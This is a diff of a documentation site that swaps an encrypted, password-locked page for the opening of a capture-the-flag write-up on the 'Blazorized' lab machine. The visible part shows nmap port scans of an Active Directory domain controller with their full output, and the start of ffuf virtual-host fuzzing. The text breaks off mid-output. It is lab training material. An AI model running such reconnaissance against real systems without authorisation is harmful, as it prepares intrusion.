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</div>
-<div id="mkdocs-decrypted-content">
-    <form id="mkdocs-decrypt-form" class="md-content__inner md-typeset">
-        <h1>Access denied</h1>
-        <p>Not available yet.</p>
-        <input class="md-input" type="password" id="mkdocs-content-password" placeholder="Password">
-        
-        <p id="mkdocs-decrypt-msg"></p>
-    </form>
-</div>
+  <h1>Blazorized</h1>
 
-<script type="text/javascript">
-var encryptcontent_id = "encryptcontent_1";
-var encryptcontent_path = "Write-Ups/Blazorized/";
-var decryption_failure_message = "Invalid password.";
-var encryptcontent_keystore = ["SOWq0OfWKY9BfJfH2Q6aNg==;sZDYKArLl66oeaLpDijDxFKqI9q1Yc/z+Cpzkf/JjXBjJMMlo/IOvGMcvk/aJIUcsL1LXWmgtqMM1wilwiA1xTUY3i7RqX3KgrupWtSf3t+sE6/bP5BGOilvz1MYx/NZ;6c99J/PclWNxfZ1lG/9gTg=="];
-var encryptcontent_obfuscate = 0;
-
-</script>
-<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/core.js"></script>
-<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/enc-base64.js"></script>
-<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/cipher-core.js"></script>
-<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/sha256.js"></script>
-<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/hmac.js"></script>
-<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/pbkdf2.js"></script>
-<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/aes.js"></script>
-<script type="text/javascript" src="../../assets/javascripts/decrypt-contents.js" defer></script>
+<p><img alt="Blazorized-Info" src="../images/Blazorized-info.png" /></p>
+<h2 id="initial-enumeration">Initial Enumeration<a class="headerlink" href="#initial-enumeration" title="Permanent link">&para;</a></h2>
+<h3 id="nmap-scan">Nmap Scan<a class="headerlink" href="#nmap-scan" title="Permanent link">&para;</a></h3>
+<p>We start off with <code>Nmap</code> and a scan with the <code>-p-</code> and <code>--min-rate 1000</code> flags to get an overview of the open ports. Once we have a list we run a deeper scan on the discovered open ports to get the services/versions and run some default scripts.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>$ sudo nmap -p- --min-rate 10000 10.129.231.74 -oN scans/all-ports-tcp.nmap                                               
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-17 22:17 CET
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>Nmap scan report for 10.129.231.74
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>Host is up (0.031s latency).
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>Not shown: 65507 closed tcp ports (reset)
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>PORT      STATE SERVICE
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>53/tcp    open  domain
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>80/tcp    open  http
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>88/tcp    open  kerberos-sec
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>135/tcp   open  msrpc
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>139/tcp   open  netbios-ssn
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>389/tcp   open  ldap
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>445/tcp   open  microsoft-ds
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>464/tcp   open  kpasswd5
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>593/tcp   open  http-rpc-epmap
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>636/tcp   open  ldapssl
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>1433/tcp  open  ms-sql-s
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>3268/tcp  open  globalcatLDAP
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>3269/tcp  open  globalcatLDAPssl
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>5985/tcp  open  wsman
+</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>9389/tcp  open  adws
+</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>47001/tcp open  winrm
+</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>49664/tcp open  unknown
+</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>49665/tcp open  unknown
+</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>49666/tcp open  unknown
+</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>49667/tcp open  unknown
+</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a>49673/tcp open  unknown
+</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a>49678/tcp open  unknown
+</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a>49679/tcp open  unknown
+</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>49684/tcp open  unknown
+</span><span id="__span-0-31"><a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a>49691/tcp open  unknown
+</span><span id="__span-0-32"><a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a>49698/tcp open  unknown
+</span><span id="__span-0-33"><a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a>49722/tcp open  unknown
+</span><span id="__span-0-34"><a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a>49776/tcp open  unknown
+</span><span id="__span-0-35"><a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a>
+</span><span id="__span-0-36"><a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a>Nmap done: 1 IP address (1 host up) scanned in 10.14 seconds
+</span><span id="__span-0-37"><a id="__codelineno-0-37" name="__codelineno-0-37" href="#__codelineno-0-37"></a>
+</span><span id="__span-0-38"><a id="__codelineno-0-38" name="__codelineno-0-38" href="#__codelineno-0-38"></a>$ sudo nmap -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,47001 -sC -sV 10.129.231.74 -oN scans/tcp-detailed.nmap
+</span><span id="__span-0-39"><a id="__codelineno-0-39" name="__codelineno-0-39" href="#__codelineno-0-39"></a>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-17 22:18 CET
+</span><span id="__span-0-40"><a id="__codelineno-0-40" name="__codelineno-0-40" href="#__codelineno-0-40"></a>Nmap scan report for 10.129.231.74
+</span><span id="__span-0-41"><a id="__codelineno-0-41" name="__codelineno-0-41" href="#__codelineno-0-41"></a>Host is up (0.043s latency).
+</span><span id="__span-0-42"><a id="__codelineno-0-42" name="__codelineno-0-42" href="#__codelineno-0-42"></a>
+</span><span id="__span-0-43"><a id="__codelineno-0-43" name="__codelineno-0-43" href="#__codelineno-0-43"></a>PORT      STATE SERVICE       VERSION
+</span><span id="__span-0-44"><a id="__codelineno-0-44" name="__codelineno-0-44" href="#__codelineno-0-44"></a>53/tcp    open  domain        Simple DNS Plus
+</span><span id="__span-0-45"><a id="__codelineno-0-45" name="__codelineno-0-45" href="#__codelineno-0-45"></a>80/tcp    open  http          Microsoft IIS httpd 10.0
+</span><span id="__span-0-46"><a id="__codelineno-0-46" name="__codelineno-0-46" href="#__codelineno-0-46"></a>|_http-title: Did not follow redirect to http://blazorized.htb
+</span><span id="__span-0-47"><a id="__codelineno-0-47" name="__codelineno-0-47" href="#__codelineno-0-47"></a>|_http-server-header: Microsoft-IIS/10.0
+</span><span id="__span-0-48"><a id="__codelineno-0-48" name="__codelineno-0-48" href="#__codelineno-0-48"></a>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-17 21:18:29Z)
+</span><span id="__span-0-49"><a id="__codelineno-0-49" name="__codelineno-0-49" href="#__codelineno-0-49"></a>135/tcp   open  msrpc         Microsoft Windows RPC
+</span><span id="__span-0-50"><a id="__codelineno-0-50" name="__codelineno-0-50" href="#__codelineno-0-50"></a>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span><span id="__span-0-51"><a id="__codelineno-0-51" name="__codelineno-0-51" href="#__codelineno-0-51"></a>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: blazorized.htb0., Site: Default-First-Site-Name)
+</span><span id="__span-0-52"><a id="__codelineno-0-52" name="__codelineno-0-52" href="#__codelineno-0-52"></a>445/tcp   open  microsoft-ds?
+</span><span id="__span-0-53"><a id="__codelineno-0-53" name="__codelineno-0-53" href="#__codelineno-0-53"></a>464/tcp   open  kpasswd5?
+</span><span id="__span-0-54"><a id="__codelineno-0-54" name="__codelineno-0-54" href="#__codelineno-0-54"></a>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span><span id="__span-0-55"><a id="__codelineno-0-55" name="__codelineno-0-55" href="#__codelineno-0-55"></a>636/tcp   open  tcpwrapped
+</span><span id="__span-0-56"><a id="__codelineno-0-56" name="__codelineno-0-56" href="#__codelineno-0-56"></a>1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1115.00; RC0+
+</span><span id="__span-0-57"><a id="__codelineno-0-57" name="__codelineno-0-57" href="#__codelineno-0-57"></a>| ms-sql-info: 
+</span><span id="__span-0-58"><a id="__codelineno-0-58" name="__codelineno-0-58" href="#__codelineno-0-58"></a>|   10.129.231.74\BLAZORIZED: 
+</span><span id="__span-0-59"><a id="__codelineno-0-59" name="__codelineno-0-59" href="#__codelineno-0-59"></a>|     Instance name: BLAZORIZED
+</span><span id="__span-0-60"><a id="__codelineno-0-60" name="__codelineno-0-60" href="#__codelineno-0-60"></a>|     Version: 
+</span><span id="__span-0-61"><a id="__codelineno-0-61" name="__codelineno-0-61" href="#__codelineno-0-61"></a>|       name: Microsoft SQL Server 2022 RC0+
+</span><span id="__span-0-62"><a id="__codelineno-0-62" name="__codelineno-0-62" href="#__codelineno-0-62"></a>|       number: 16.00.1115.00
+</span><span id="__span-0-63"><a id="__codelineno-0-63" name="__codelineno-0-63" href="#__codelineno-0-63"></a>|       Product: Microsoft SQL Server 2022
+</span><span id="__span-0-64"><a id="__codelineno-0-64" name="__codelineno-0-64" href="#__codelineno-0-64"></a>|       Service pack level: RC0
+</span><span id="__span-0-65"><a id="__codelineno-0-65" name="__codelineno-0-65" href="#__codelineno-0-65"></a>|       Post-SP patches applied: true
+</span><span id="__span-0-66"><a id="__codelineno-0-66" name="__codelineno-0-66" href="#__codelineno-0-66"></a>|     TCP port: 1433
+</span><span id="__span-0-67"><a id="__codelineno-0-67" name="__codelineno-0-67" href="#__codelineno-0-67"></a>|_    Clustered: false
+</span><span id="__span-0-68"><a id="__codelineno-0-68" name="__codelineno-0-68" href="#__codelineno-0-68"></a>| ms-sql-ntlm-info: 
+</span><span id="__span-0-69"><a id="__codelineno-0-69" name="__codelineno-0-69" href="#__codelineno-0-69"></a>|   10.129.231.74\BLAZORIZED: 
+</span><span id="__span-0-70"><a id="__codelineno-0-70" name="__codelineno-0-70" href="#__codelineno-0-70"></a>|     Target_Name: BLAZORIZED
+</span><span id="__span-0-71"><a id="__codelineno-0-71" name="__codelineno-0-71" href="#__codelineno-0-71"></a>|     NetBIOS_Domain_Name: BLAZORIZED
+</span><span id="__span-0-72"><a id="__codelineno-0-72" name="__codelineno-0-72" href="#__codelineno-0-72"></a>|     NetBIOS_Computer_Name: DC1
+</span><span id="__span-0-73"><a id="__codelineno-0-73" name="__codelineno-0-73" href="#__codelineno-0-73"></a>|     DNS_Domain_Name: blazorized.htb
+</span><span id="__span-0-74"><a id="__codelineno-0-74" name="__codelineno-0-74" href="#__codelineno-0-74"></a>|     DNS_Computer_Name: DC1.blazorized.htb
+</span><span id="__span-0-75"><a id="__codelineno-0-75" name="__codelineno-0-75" href="#__codelineno-0-75"></a>|     DNS_Tree_Name: blazorized.htb
+</span><span id="__span-0-76"><a id="__codelineno-0-76" name="__codelineno-0-76" href="#__codelineno-0-76"></a>|_    Product_Version: 10.0.17763
+</span><span id="__span-0-77"><a id="__codelineno-0-77" name="__codelineno-0-77" href="#__codelineno-0-77"></a>|_ssl-date: 2025-01-17T21:18:43+00:00; +1s from scanner time.
+</span><span id="__span-0-78"><a id="__codelineno-0-78" name="__codelineno-0-78" href="#__codelineno-0-78"></a>| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+</span><span id="__span-0-79"><a id="__codelineno-0-79" name="__codelineno-0-79" href="#__codelineno-0-79"></a>| Not valid before: 2025-01-17T21:15:45
+</span><span id="__span-0-80"><a id="__codelineno-0-80" name="__codelineno-0-80" href="#__codelineno-0-80"></a>|_Not valid after:  2055-01-17T21:15:45
+</span><span id="__span-0-81"><a id="__codelineno-0-81" name="__codelineno-0-81" href="#__codelineno-0-81"></a>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: blazorized.htb0., Site: Default-First-Site-Name)
+</span><span id="__span-0-82"><a id="__codelineno-0-82" name="__codelineno-0-82" href="#__codelineno-0-82"></a>3269/tcp  open  tcpwrapped
+</span><span id="__span-0-83"><a id="__codelineno-0-83" name="__codelineno-0-83" href="#__codelineno-0-83"></a>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span><span id="__span-0-84"><a id="__codelineno-0-84" name="__codelineno-0-84" href="#__codelineno-0-84"></a>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span><span id="__span-0-85"><a id="__codelineno-0-85" name="__codelineno-0-85" href="#__codelineno-0-85"></a>|_http-title: Not Found
+</span><span id="__span-0-86"><a id="__codelineno-0-86" name="__codelineno-0-86" href="#__codelineno-0-86"></a>9389/tcp  open  mc-nmf        .NET Message Framing
+</span><span id="__span-0-87"><a id="__codelineno-0-87" name="__codelineno-0-87" href="#__codelineno-0-87"></a>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span><span id="__span-0-88"><a id="__codelineno-0-88" name="__codelineno-0-88" href="#__codelineno-0-88"></a>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span><span id="__span-0-89"><a id="__codelineno-0-89" name="__codelineno-0-89" href="#__codelineno-0-89"></a>|_http-title: Not Found
+</span><span id="__span-0-90"><a id="__codelineno-0-90" name="__codelineno-0-90" href="#__codelineno-0-90"></a>Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span><span id="__span-0-91"><a id="__codelineno-0-91" name="__codelineno-0-91" href="#__codelineno-0-91"></a>
+</span><span id="__span-0-92"><a id="__codelineno-0-92" name="__codelineno-0-92" href="#__codelineno-0-92"></a>Host script results:
+</span><span id="__span-0-93"><a id="__codelineno-0-93" name="__codelineno-0-93" href="#__codelineno-0-93"></a>| smb2-time: 
+</span><span id="__span-0-94"><a id="__codelineno-0-94" name="__codelineno-0-94" href="#__codelineno-0-94"></a>|   date: 2025-01-17T21:18:38
+</span><span id="__span-0-95"><a id="__codelineno-0-95" name="__codelineno-0-95" href="#__codelineno-0-95"></a>|_  start_date: N/A
+</span><span id="__span-0-96"><a id="__codelineno-0-96" name="__codelineno-0-96" href="#__codelineno-0-96"></a>|_clock-skew: mean: 1s, deviation: 0s, median: 0s
+</span><span id="__span-0-97"><a id="__codelineno-0-97" name="__codelineno-0-97" href="#__codelineno-0-97"></a>| smb2-security-mode: 
+</span><span id="__span-0-98"><a id="__codelineno-0-98" name="__codelineno-0-98" href="#__codelineno-0-98"></a>|   3:1:1: 
+</span><span id="__span-0-99"><a id="__codelineno-0-99" name="__codelineno-0-99" href="#__codelineno-0-99"></a>|_    Message signing enabled and required
+</span><span id="__span-0-100"><a id="__codelineno-0-100" name="__codelineno-0-100" href="#__codelineno-0-100"></a>
+</span><span id="__span-0-101"><a id="__codelineno-0-101" name="__codelineno-0-101" href="#__codelineno-0-101"></a>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span><span id="__span-0-102"><a id="__codelineno-0-102" name="__codelineno-0-102" href="#__codelineno-0-102"></a>Nmap done: 1 IP address (1 host up) scanned in 23.80 seconds
+</span></code></pre></div>
+<ul>
+<li>Active Directory Domain Controller (LDAP)</li>
+<li>Domain name: <code>blazorized.htb</code></li>
+<li>Host name: <code>DC1</code></li>
+<li>HTTP 80/TCP (redirect to <code>http://blazorized.htb</code>)</li>
+<li>MSSQL Server 1433/TCP</li>
+</ul>
+<p>We add everything to our <code>/etc/hosts</code> file and move on to enumerating the website on 80/TCP.</p>
+<h3 id="port-80tcp">Port 80/TCP<a class="headerlink" href="#port-80tcp" title="Permanent link">&para;</a></h3>
+<p>During manual enumeration we find the website being a static website and using <code>Blazor WebAssembly</code>.</p>
+<p><img alt="Blazorized.png" src="../images/Blazorized.png" /></p>
+<p>We continue by fuzzing for virtual hosts using <code>FFuF</code> and discover the <code>admin.blazorized.htb</code> virtual host.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>$ ffuf -u http://blazorized.htb -w /usr/share/seclists/Discovery/DNS/namelist.txt -H &quot;Host: FUZZ.blazorized.htb&quot; -fs 144
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>        /&#39;___\  /&#39;___\           /&#39;___\       
